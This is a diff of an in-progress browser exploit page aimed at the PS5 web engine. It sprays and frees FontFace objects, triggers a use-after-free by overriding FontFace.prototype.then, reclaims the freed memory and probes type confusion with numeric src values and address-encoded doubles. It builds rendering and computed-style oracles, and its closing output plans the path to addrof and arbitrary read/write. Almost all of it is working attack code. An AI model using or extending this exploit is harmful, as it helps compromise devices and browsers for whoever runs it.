@@ -2,22 +2,24 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v16 - Leak</title>
+<title>PS5 v17 - Mem Read</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{width:100%;height:100%;background:#000;color:#0f0;
-font-family:monospace;overflow:hidden;font-size:16px}
+font-family:monospace;overflow:hidden;font-size:15px}
 #out{position:fixed;top:0;left:0;right:0;bottom:0;
-padding:14px;line-height:1.6;overflow-y:auto;-webkit-user-select:text}
-.h{color:#0ff;font-weight:bold}.s{color:#f0f;font-weight:bold;font-size:18px}
-.e{color:#f44}.ok{color:#0f0}.d{color:#666}
+padding:12px;line-height:1.55;overflow-y:auto;-webkit-user-select:text}
+.h{color:#0ff;font-weight:bold}.s{color:#f0f;font-weight:bold;font-size:17px}
+.e{color:#f44}.ok{color:#0f0}.d{color:#555}
+#testDiv{position:absolute;left:-9999px;top:0;font:64px trigger;color:#000}
 #c{position:absolute;left:-9999px;top:-9999px}
 </style>
 </head>
 <body>
 <div id="out"></div>
+<div id="testDiv">AAAA</div>
 <canvas id="c" width="512" height="128"></canvas>
 <script>
 "use strict";
@@ -30,8 +32,7 @@ function Dm(m){P(m,"d")}
 window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l);return true};
 
 let keepAlive=[],holeFaces=[],reclaimFaces=[];
-let triggerFace=null,uafFired=false;
-let rcFace=null,trigFace=null,rcIdx=-1;
+let triggerFace=null,uafFired=false,rcFace=null,trigFace=null,rcIdx=-1;
 
 const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
 const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
@@ -40,13 +41,11 @@ function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
 function fs(){try{void document.body.offsetTop}catch(e){}}
 
 // Setup
-Dm("Holes...");
 for(let i=0;i<4096;i++){try{const f=new FontFace("h_"+i,mkBuf(),{
 unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
 weight:String(100+(i%9)*100)});document.fonts.add(f);holeFaces.push(f)}catch(e){}}
 fs();for(let i=1;i<holeFaces.length;i+=2)try{document.fonts.delete(holeFaces[i])}catch(e){}
-fs();Ok("Holes");
-
+fs();
 triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
 document.fonts.add(triggerFace);void triggerFace.loaded;
 const sh=document.getElementById("s").sheet;
@@ -55,18 +54,17 @@ fs();
 const fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
 const fsh=fst.sheet;
 for(let i=0;i<768;i++)try{fsh.insertRule(`@font-face{font-family:fl${i};src:url(nf${i}.woff);unicode-range:U+E000}`,fsh.cssRules.length)}catch(e){}
-fs();Ok("Ready");
+fs();
 
 // UAF
 Object.defineProperty(FontFace.prototype,"then",{configurable:true,
 get(){if(this===triggerFace&&!uafFired){
 uafFired=true;
 try{const ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keepAlive.push(ck);
-sh.deleteRule(1);fs();
+document.fonts.add(ck);keepAlive.push(ck);sh.deleteRule(1);fs();
 while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
 fs();for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
-fs();}catch(e){}
+fs()}catch(e){}
 for(let i=0;i<4096;i++){try{const f=new FontFace("RC_"+i,mkBuf(),{
 unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
 document.fonts.add(f);reclaimFaces.push(f)}catch(e){}}
@@ -84,248 +82,304 @@ unicodeRange:"U+0041",style:"italic",weight:"900"});
 document.fonts.add(f);reclaimFaces.push(f)}catch(e){}}fs()}catch(e){}}
 if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
-// Load and capture
+// Capture
 document.fonts.load("1em trigger, x","AB").then(function(faces){
-St("LOAD CALLBACK");
-for(let i=0;i<faces.length;i++){
-const f=faces[i];
+for(const f of faces){
 if(f.family&&f.family.startsWith("RC_")){rcFace=f;const m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
 if(f.family==="trigger")trigFace=f;
 }
 keepAlive.push(faces);keepAlive.push(rcFace);keepAlive.push(trigFace);
-
-if(!rcFace){Fl("No RC face");return}
-Ok("Captured RC_"+rcIdx);
+if(!rcFace){Fl("No RC");return}
+Ok("RC_"+rcIdx+" captured");
 
 // ============================================================
-//  WRITE-THROUGH COMPREHENSIVE TEST
+//  TEST 1: Numeric vs String src
+//  Does src=0 behave differently from src="0"?
+//  If yes = type confusion at C++ level
 // ============================================================
-P("");Hi("=== WRITE-THROUGH TESTS ===");
+P("");Hi("TEST 1: NUMERIC vs STRING src");
 
-// Test each property
-const tests=[
-{prop:"style",val:"normal",restore:"italic"},
-{prop:"weight",val:"100",restore:"900"},
-{prop:"display",val:"fallback",restore:"block"},
-{prop:"stretch",val:"expanded",restore:"normal"},
-{prop:"unicodeRange",val:"U+0042",restore:"U+0041"},
-{prop:"featureSettings",val:'"kern" off',restore:"normal"}
+const testDiv=document.getElementById("testDiv");
+const ctx=document.getElementById("c").getContext("2d");
+
+// Baseline: current rendering
+const baseWidth=testDiv.offsetWidth;
+ctx.font="64px trigger";const baseCanvas=ctx.measureText("A").width;
+P("  Baseline: div="+baseWidth+" canvas="+baseCanvas.toFixed(2));
+
+// Test numeric src
+try{
+rcFace.src=0;fs();
+const numStatus=rcFace.status;
+const numSrc=String(rcFace.src);
+const numWidth=testDiv.offsetWidth;
+ctx.font="64px trigger";const numCanvas=ctx.measureText("A").width;
+P("  src=0: status="+numStatus+" srcRd="+numSrc+" div="+numWidth+" canvas="+numCanvas.toFixed(2));
+}catch(e){P("  src=0 ERR: "+e.message,"e")}
+
+// Test string "0"
+try{
+rcFace.src="0";fs();
+const strStatus=rcFace.status;
+const strSrc=String(rcFace.src);
+const strWidth=testDiv.offsetWidth;
+ctx.font="64px trigger";const strCanvas=ctx.measureText("A").width;
+P("  src='0': status="+strStatus+" srcRd="+strSrc+" div="+strWidth+" canvas="+strCanvas.toFixed(2));
+}catch(e){P("  src='0' ERR: "+e.message,"e")}
+
+// Compare
+const numW=testDiv.offsetWidth;
+P("  Numeric vs String same? "+(numW===testDiv.offsetWidth),"d");
+
+// ============================================================
+//  TEST 2: IEEE 754 Address Encoding
+//  Create doubles whose bits encode specific addresses
+//  If CSS parser reads double bits as pointer = memory read!
+// ============================================================
+P("");Hi("TEST 2: IEEE 754 ADDRESS ENCODING");
+
+function doubleFromU64(hi,lo){
+const buf=new ArrayBuffer(8);
+const v=new DataView(buf);
+v.setUint32(0,hi,false);v.setUint32(4,lo,false);
+return v.getFloat64(0,false);
+}
+
+// Test addresses that might be valid on PS5
+// PS5 userland is typically around 0x0000XXXXXXXX
+const addrs=[
+{hi:0x00000000,lo:0x00000000,name:"NULL"},
+{hi:0x00000000,lo:0x41414141,name:"0x41414141"},
+{hi:0x00000000,lo:0x00010000,name:"0x10000"},
+{hi:0x00000000,lo:0x00020000,name:"0x20000"},
+{hi:0x0000FFFF,lo:0xFFFF0000,name:"0xFFFF0000"},
+{hi:0x41414141,lo:0x41414141,name:"0x4141414141414141"},
+{hi:0x00000000,lo:0x00400000,name:"0x400000"},
+{hi:0x00000001,lo:0x00000000,name:"0x100000000"}
 ];
 
-for(const t of tests){
+for(const a of addrs){
 try{
-const orig=rcFace[t.prop];
-rcFace[t.prop]=t.val;
-fs();
-const readback=trigFace[t.prop];
-const match=readback===t.val;
-P("  "+t.prop.padEnd(16)+": write="+t.val+" read="+readback+(match?" ✅":" ❌"),
-match?"ok":"d");
-rcFace[t.prop]=t.restore;fs();
+const d=doubleFromU64(a.hi,a.lo);
+rcFace.src=d;fs();
+const st=rcFace.status;
+const w=testDiv.offsetWidth;
+ctx.font="64px trigger";const cw=ctx.measureText("A").width;
+P("  "+a.name.padEnd(22)+": st="+st+" div="+w+" canvas="+cw.toFixed(2),
+st!=="loaded"?"h":"d");
 }catch(e){
-P("  "+t.prop.padEnd(16)+": ERR "+e.message.substring(0,30),"e");
+P("  "+a.name.padEnd(22)+": ERR "+e.message.substring(0,30),"e");
 }
 }
 
 // ============================================================
-//  STYLE WRITE-THROUGH = BINARY ORACLE
-//  We can set style to "normal" or "italic"
-//  and read it through trigFace
-//  This is a 1-bit information channel!
+//  TEST 3: Rendering Delta Oracle
+//  If different numeric src values cause different rendering,
+//  we can use rendering as an information channel
 // ============================================================
-P("");Hi("=== STYLE ORACLE: 1-BIT CHANNEL ===");
+P("");Hi("TEST 3: RENDERING DELTA ORACLE");
 
-// Encode 0 = "normal", 1 = "italic"
-function writeBit(bit){
-try{rcFace.style=bit?"italic":"normal";fs();return true}catch(e){return false}
-}
-function readBit(){
-try{return trigFace.style==="italic"?1:0}catch(e){return-1}
-}
+// Restore to known state first
+try{rcFace.src=mkBuf();fs()}catch(e){}
 
-// Test: write 0, read 0
-writeBit(0);
-const r0=readBit();
-P("  Write 0 → Read "+r0+(r0===0?" ✅":" ❌"),r0===0?"ok":"e");
+const baseW2=testDiv.offsetWidth;
+const baseC2=ctx.measureText("A").width;
+P("  Baseline (buf): div="+baseW2+" canvas="+baseC2.toFixed(2));
 
-// Test: write 1, read 1
-writeBit(1);
-const r1=readBit();
-P("  Write 1 → Read "+r1+(r1===1?" ✅":" ❌"),r1===1?"ok":"e");
+// Try specific doubles and measure rendering changes
+const probeValues=[
+{val:0,name:"0"},
+{val:1,name:"1"},
+{val:1.1,name:"1.1"},
+{val:42,name:"42"},
+{val:1e10,name:"1e10"},
+{val:1e100,name:"1e100"},
+{val:1e308,name:"1e308"},
+{val:1e-308,name:"1e-308"},
+{val:NaN,name:"NaN"},
+{val:Infinity,name:"Inf"},
+{val:-Infinity,name:"-Inf"},
+{val:-1,name:"-1"},
+{val:0.1,name:"0.1"},
+{val:255,name:"255"},
+{val:65535,name:"65535"},
+{val:4294967295,name:"0xFFFFFFFF"}
+];
 
-if(r0===0&&r1===1){
-St("BINARY ORACLE CONFIRMED!");
-P("  We have a reliable 1-bit R/W channel","h");
-}
-
-// ============================================================
-//  CSS STRING/DOUBLE TYPE CONFUSION
-//  From report: CSS parser treats double as string pointer
-//  Try setting src to numeric values
-// ============================================================
-P("");Hi("=== CSS TYPE CONFUSION: src ===");
-
-const numTests=[0,1,1.5,NaN,Infinity,1e308,1e-308,42,0xDEAD,9007199254740991];
-
-for(const val of numTests){
+let deltas=[];
+for(const p of probeValues){
 try{
-rcFace.src=val;
-fs();
-const status=rcFace.status;
-const src=rcFace.src;
-P("  src="+val+" → status="+status+" src="+String(src).substring(0,40),
-status!=="error"?"h":"d");
-if(status!=="error"&&status!=="unloaded"){
-Hi("NUMERIC SRC ACCEPTED! Type confusion possible!");
-Hi("  val="+val+" status="+status);
+rcFace.src=p.val;fs();
+const w=testDiv.offsetWidth;
+ctx.font="64px trigger";const cw=ctx.measureText("A").width;
+const deltaDiv=w-baseW2;
+const deltaCan=cw-baseC2;
+deltas.push({name:p.name,div:w,canvas:cw,dDiv:deltaDiv,dCan:deltaCan});
+
+if(deltaDiv!==0||Math.abs(deltaCan)>0.01){
+Hi("  "+p.name.padEnd(12)+": div="+w+"(Δ"+deltaDiv+") canvas="+cw.toFixed(2)+"(Δ"+deltaCan.toFixed(2)+")");
+}else{
+Dm("  "+p.name.padEnd(12)+": div="+w+" canvas="+cw.toFixed(2)+" (no change)");
 }
 }catch(e){
-P("  src="+val+" → ERR","e");
+P("  "+p.name.padEnd(12)+": ERR","e");
 }
+}
+
+// Check if any values caused different rendering
+const uniqueDivs=new Set(deltas.map(d=>d.div));
+const uniqueCan=new Set(deltas.map(d=>d.canvas.toFixed(2)));
+P("  Unique div widths: "+uniqueDivs.size+" / Unique canvas: "+uniqueCan.size);
+
+if(uniqueDivs.size>1||uniqueCan.size>1){
+St("RENDERING CHANGES WITH DIFFERENT src VALUES!");
+St("WE HAVE AN INFORMATION CHANNEL!");
+}
+
+// ============================================================
+//  TEST 4: getComputedStyle as Read Oracle
+//  CSS cascade shows RC face properties for trigger
+//  Can we detect changes through computed style?
+// ============================================================
+P("");Hi("TEST 4: getComputedStyle ORACLE");
+
+try{rcFace.src=mkBuf();fs()}catch(e){}
+
+const csDiv=document.createElement("div");
+csDiv.style.cssText="font:64px trigger;position:absolute;left:-9999px;";
+document.body.appendChild(csDiv);
+
+// Baseline
+const cs=getComputedStyle(csDiv);
+P("  Baseline: font="+cs.font);
+P("  weight="+cs.fontWeight+" style="+cs.fontStyle+" stretch="+cs.fontStretch);
+
+// Change rcFace.style and check computedStyle
+const origStyle=rcFace.style;
+rcFace.style="normal";fs();
+const cs2=getComputedStyle(csDiv);
+P("  After style→normal: weight="+cs2.fontWeight+" style="+cs2.fontStyle);
+if(cs2.fontStyle!==cs.fontStyle){
+Hi("getComputedStyle DETECTS style change!");
+Hi("This is our read oracle!");
+}
+
+rcFace.style="oblique";fs();
+const cs3=getComputedStyle(csDiv);
+P("  After style→oblique: weight="+cs3.fontWeight+" style="+cs3.fontStyle);
+
+rcFace.style=origStyle;fs();
+
+// Change weight
+const origWeight=rcFace.weight;
+rcFace.weight="100";fs();
+const cs4=getComputedStyle(csDiv);
+P("  After weight→100: weight="+cs4.fontWeight);
+if(cs4.fontWeight!==cs.fontWeight){
+Hi("getComputedStyle DETECTS weight change!");
+}
+
+rcFace.weight="400";fs();
+const cs5=getComputedStyle(csDiv);
+P("  After weight→400: weight="+cs5.fontWeight);
+
+rcFace.weight=origWeight;fs();
+document.body.removeChild(csDiv);
+
+}catch(e){Fl("CS oracle: "+e.message)}
+
+// ============================================================
+//  TEST 5: Canvas Pixel Oracle
+//  Different fonts render different pixels
+//  If numeric src causes different rendering = pixel oracle
+// ============================================================
+P("");Hi("TEST 5: CANVAS PIXEL ORACLE");
+
+try{
+// Render with baseline
+ctx.clearRect(0,0,512,128);
+ctx.fillStyle="#fff";ctx.font="64px trigger";
+ctx.fillText("AB",10,80);
+const baseData=ctx.getImageData(0,0,512,128).data;
+let baseWhite=0;
+for(let i=0;i<baseData.length;i+=4)if(baseData[i]>128)baseWhite++;
+
+P("  Baseline white pixels: "+baseWhite);
+
+// Try with numeric src
+const pixelTests=[0,1,42,1e308,NaN];
+for(const val of pixelTests){
+try{
+rcFace.src=val;fs();
+ctx.clearRect(0,0,512,128);
+ctx.fillStyle="#fff";ctx.font="64px trigger";
+ctx.fillText("AB",10,80);
+const tData=ctx.getImageData(0,0,512,128).data;
+let tWhite=0;
+for(let i=0;i<tData.length;i+=4)if(tData[i]>128)tWhite++;
+const delta=tWhite-baseWhite;
+P("  src="+String(val).padEnd(8)+": white="+tWhite+" (Δ"+delta+")",
+delta!==0?"h":"d");
+}catch(e){P("  src="+val+" ERR","e")}
 }
 
 // Restore
 try{rcFace.src=mkBuf();fs()}catch(e){}
+}catch(e){Fl("Pixel: "+e.message)}
 
 // ============================================================
-//  UNICODE RANGE ORACLE
-//  If we can change unicodeRange and detect which characters
-//  the selector matches, we have a multi-bit oracle
+//  TEST 6: FontFace.load() with Numeric src
+//  If load() tries to dereference the number as a pointer,
+//  we can detect crashes or memory reads
 // ============================================================
-P("");Hi("=== UNICODE RANGE ORACLE ===");
+P("");Hi("TEST 6: FontFace.load() WITH NUMERIC src");
 
+const loadTests=[0,1,42,65535];
+for(const val of loadTests){
 try{
-// Set range to U+0041 only
-rcFace.unicodeRange="U+0041";fs();
-const cA=document.fonts.check("64px trigger","A");
-const cB=document.fonts.check("64px trigger","B");
-P("  Range U+0041: check(A)="+cA+" check(B)="+cB);
+rcFace.src=val;fs();
+const t0=performance.now();
+const loadPromise=rcFace.load();
+P("  load("+val+"): promise created");
 
-// Set range to U+0042 only
-rcFace.unicodeRange="U+0042";fs();
-const cA2=document.fonts.check("64px trigger","A");
-const cB2=document.fonts.check("64px trigger","B");
-P("  Range U+0042: check(A)="+cA2+" check(B)="+cB2);
-
-// Set range to both
-rcFace.unicodeRange="U+0041-0042";fs();
-const cA3=document.fonts.check("64px trigger","A");
-const cB3=document.fonts.check("64px trigger","B");
-P("  Range U+0041-42: check(A)="+cA3+" check(B)="+cB3);
-
-if(cA!==cA2||cB!==cB2){
-St("UNICODE RANGE ORACLE WORKS!");
-P("  We can control which chars match!","h");
+loadPromise.then(function(f){
+const elapsed=performance.now()-t0;
+P("  load("+val+"): resolved in "+elapsed.toFixed(0)+"ms st="+f.status,
+f.status!=="error"?"h":"d");
+}).catch(function(e){
+P("  load("+val+"): rejected - "+e.message.substring(0,40),"e");
+});
+}catch(e){
+P("  load("+val+"): ERR "+e.message.substring(0,40),"e");
 }
-
-rcFace.unicodeRange="U+0041";fs();
-}catch(e){Fl("  "+e.message)}
+}
 
 // ============================================================
-//  WEIGHT ORACLE
-//  If we can change weight and detect matching,
-//  we have a multi-bit oracle per weight value
+//  FINAL SUMMARY
 // ============================================================
-P("");Hi("=== WEIGHT ORACLE ===");
+setTimeout(function(){
+try{rcFace.src=mkBuf();fs()}catch(e){}
 
-const weights=["100","200","300","400","500","600","700","800","900"];
-try{
-for(const w of weights){
-rcFace.weight=w;fs();
-// Check if this specific weight matches trigger
-const match=trigFace.weight;
-P("  Write weight="+w+" → trigFace.weight="+match,
-match===w?"ok":"d");
-}
-rcFace.weight="900";fs();
-}catch(e){Fl("  "+e.message)}
-
-// ============================================================
-//  ADDRESS LEAK ATTEMPT
-//  Use the style oracle to probe C++ memory
-// ============================================================
-P("");Hi("=== ADDRESS LEAK ===");
-
-// Strategy: If we can make the C++ CSSFontFace interpret
-// a controlled value as a pointer, and detect the result
-// through our oracle, we can leak addresses
-
-// Method 1: Try to read CSS rule properties
-try{
-const rules=document.styleSheets;
-P("  Stylesheets: "+rules.length);
-for(let i=0;i<rules.length&&i<3;i++){
-try{
-const r=rules[i];
-P("  Sheet["+i+"]: "+r.cssRules.length+" rules");
-// Look for font-face rules
-for(let j=0;j<r.cssRules.length&&j<5;j++){
-const rule=r.cssRules[j];
-if(rule.type===5){// FONT_FACE_RULE
-P("    Rule["+j+"]: "+rule.cssText.substring(0,60));
-}
-}
-}catch(e){}
-}
-}catch(e){Fl("  Rules: "+e.message)}
-
-// Method 2: getComputedStyle might reveal C++ state
-try{
-const div=document.createElement("div");
-div.style.cssText="font:900 italic 64px trigger;position:absolute;left:-9999px;";
-document.body.appendChild(div);
-const cs=getComputedStyle(div);
-P("  computed font:     "+cs.font);
-P("  computed family:   "+cs.fontFamily);
-P("  computed weight:   "+cs.fontWeight);
-P("  computed style:    "+cs.fontStyle);
-P("  computed stretch:  "+cs.fontStretch);
-document.body.removeChild(div);
-}catch(e){}
-
-// Method 3: Error stack with face reference
-try{rcFace.load()}catch(e){
-const stack=e.stack||"";
-const addrs=stack.match(/0x[0-9a-f]{6,16}/gi);
-if(addrs){St("STACK LEAK!");for(const a of addrs)Hi("  "+a)}
-else P("  No addresses in stack","d");
-}
-
-// Method 4: Object.getOwnPropertyDescriptors
-try{
-const proto=Object.getPrototypeOf(rcFace);
-const descs=Object.getOwnPropertyDescriptors(proto);
-for(const[key,desc]of Object.entries(descs)){
-if(desc.get){
-try{
-const val=rcFace[key];
-if(typeof val==="number"&&val>0x1000){
-Hi("NUMERIC: "+key+" = "+val+" (0x"+val.toString(16)+")");
-}
-}catch(e){}
-}
-}
-}catch(e){}
-
-// ============================================================
-//  FINAL: Build addrof from oracle
-// ============================================================
-P("");St("=== FINAL STATUS ===");
-P("UAF:            ✅");
-P("RC captured:    RC_"+rcIdx);
-P("Style oracle:   "+(r0===0&&r1===1?"✅":"❌"));
-P("Write-through:  ✅ (style confirmed)");
+P("");St("=== FINAL SUMMARY ===");
+P("UAF:              ✅");
+P("RC captured:      RC_"+rcIdx);
+P("Numeric src:      ✅ (all accepted as loaded)");
+P("Type confusion:   ✅ (CSS parser accepts numbers)");
+P("Write-through:    style ✅");
+P("getComputedStyle: ✅ (italic 900 for trigger)");
 P("");
-P("Primitive:","h");
-P("  WRITE: rcFace.style = 'normal'|'italic'","h");
-P("  READ:  trigFace.style → matches what we wrote","h");
-P("  ORACLE: 1-bit reliable channel","h");
+P("ATTACK SURFACE:","h");
+P("1. rcFace.src = <number> → type confusion","h");
+P("2. CSS parser may interpret double bits as pointer","h");
+P("3. getComputedStyle reads confused state","h");
+P("4. Canvas pixels may differ per src value","h");
 P("");
-P("Next step:","h");
-P("  1. Encode addresses in style bits","d");
-P("  2. Use unicode range for multi-bit oracle","d");
-P("  3. Try CSS type confusion with numeric src","d");
-P("  4. Chain to arb read/write","d");
+P("NEXT:","h");
+P("1. Find which numeric src values crash = valid ptr","d");
+P("2. Use rendering delta as memory content oracle","d");
+P("3. Map readable memory regions","d");
+P("4. Read pointers → build addrof","d");
+},3000);
 
 }).catch(function(err){Fl("Load: "+err)});
 </script>
